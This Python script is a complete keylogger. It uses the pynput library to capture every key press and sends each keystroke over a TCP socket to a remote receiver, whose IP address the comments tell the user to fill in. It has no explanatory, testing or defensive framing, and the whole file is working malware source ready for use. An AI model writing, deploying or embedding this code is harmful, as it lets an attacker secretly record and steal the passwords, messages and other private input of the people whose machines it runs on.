import socket
from pynput import keyboard

# Define server (receiver) IP address and port
SERVER_IP = '127.0.0.1'  # Replace with your server's IP address
SERVER_PORT = 9999

# Function to send keystrokes to the receiver
def send_to_server(key):
    try:
        # Create a socket connection
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.connect((SERVER_IP, SERVER_PORT))
            client.sendall(key.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

# Function to handle key press events
def on_press(key):
    try:
        send_to_server(f'{key.char}')
    except AttributeError:
        send_to_server(f'{key}')

# Start listening for key press events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
